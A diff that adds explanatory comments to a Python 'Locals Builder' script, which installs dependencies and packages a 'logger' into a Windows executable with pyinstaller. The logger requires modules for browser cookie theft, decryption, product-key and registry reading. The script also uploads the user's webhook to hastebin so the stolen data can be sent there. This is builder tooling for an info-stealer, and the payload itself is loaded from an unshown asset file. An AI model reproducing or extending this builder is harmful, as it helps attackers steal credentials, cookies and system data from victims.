@@ -1,3 +1,4 @@
+# Imports
 print("Loading, this may take a couple of minutes.")
 import subprocess
 import os
@@ -5,8 +6,10 @@ import time
 import shutil
 import random
 
+# Libraries that will be installed
 modulesToInstall = ["requests", "alive_progress", "colorama", "pyfiglet"]
 
+# Function to install library
 def setup(module: str):
         attempt = subprocess.getoutput(f"pip install {module}")
         if "'pip' not recognized" in attempt:
@@ -15,6 +18,7 @@ def setup(module: str):
         else:
             return
 
+# Installs each module in list that we declared above
 for name in modulesToInstall:
     if name == "alive_progress":
         try:
@@ -34,15 +38,20 @@ for name in modulesToInstall:
         setup(name)
         exec("import " + name)
 
+# Random list of different fonts for pyfiglet
 randList = ["sland", "standard", "doom", "epic", "big"]
 
+# Defining our pyfiglet configuration
 f = pyfiglet.Figlet(font=random.choice(randList))
+# Colorama module configuration
 init()
 
+# Prints the title
 def title():
     print(Fore.BLUE + Style.BRIGHT + f.renderText('Locals Builder'))
     print(Fore.CYAN + Style.BRIGHT + "          Made by Local#0001 | github.com/localsgithub\n")
 
+# Cosmetic transition
 def transition(text):
     clear()
     title()
@@ -59,12 +68,14 @@ def transition(text):
     clear()
     title()
 
+# Clear screen based on your platform
 def clear():
     if os.name == 'nt':
         os.system('cls')
     elif os.name == "posix":
         os.system('clear')
 
+# The builder that uses pyinstaller
 def build():
     check = subprocess.getoutput("pyinstaller")
     if "'pyinstaller' not recognized" in check:
@@ -108,16 +119,21 @@ def build():
     title()
     print(Fore.GREEN + Style.BRIGHT + "[+] Success! Executable saved to 'EXE'")
     exit()
-    
+
+# Exception template for raising custom exceptions
 class ExceptionTemplate(Exception):
     def __str__(self):
         return ' '.join(self.args)
 
+# People couldn't figure out how to make pastes with pastebin so it automatically does it for them
 def makePaste(webhook: str):
     r = requests.post("https://hastebin.com/documents", data=webhook).json()
     return "https://hastebin.com/raw/" + r['key']
 
+# Installs requirements needed for the logger incase you compile it to a executbale (pyinstaller needs to grab the module files)
+# or incase you try to run the python script and you dont know how to use pip
 def requirements():
+    # Installs any modules not alraedy installed
     def install(module: str):
         print(Fore.RED + Style.BRIGHT + f"[-] Module '{module}' was not found. Attempting to install.")
         attempt = subprocess.getoutput(f"pip install {module}")
@@ -127,6 +143,7 @@ def requirements():
         else:
             return print(Fore.GREEN + Style.BRIGHT + f"[+] Module {module} was successfully installed.")
 
+    # Checks if the module is already installed and to see if it isnt it attempts to import it into this builder.
     def check(modules: list, bar):
         print(Fore.YELLOW + Style.BRIGHT + "\n[!] Restart this script if requirements take longer than 2 minutes to install.\n\n")
         for module in modules:
@@ -173,6 +190,7 @@ def requirements():
                     bar()
         return
     
+    
     transition("Checking for requirements")
     listOfModules = ["wmi", "windows_tools.product_key", "winregistry", "psutil", "Pillow", "pypiwin32", "browser_cookie3", "pycryptodome", "pywin32", "requests", "psutial"]
     with alive_bar(len(listOfModules), stats=False, enrich_print=False, spinner="classic") as bar:
@@ -180,6 +198,7 @@ def requirements():
     time.sleep(3)
     return True
 
+# Main part of the builder
 def start():
     with open("assets/start.txt", "r", encoding="utf8") as file:
         code = file.read()
@@ -252,11 +271,13 @@ def start():
         exit()
         
 if __name__ == '__main__':
+    # idk
     if requirements() == True:
         try:
             transition("Transferring to builder")
             start()
         except FileNotFoundError as e:
+            # Our custom exception
             class AssetsMissing(ExceptionTemplate):
                 __module__ = Exception.__module__ 
                 pass
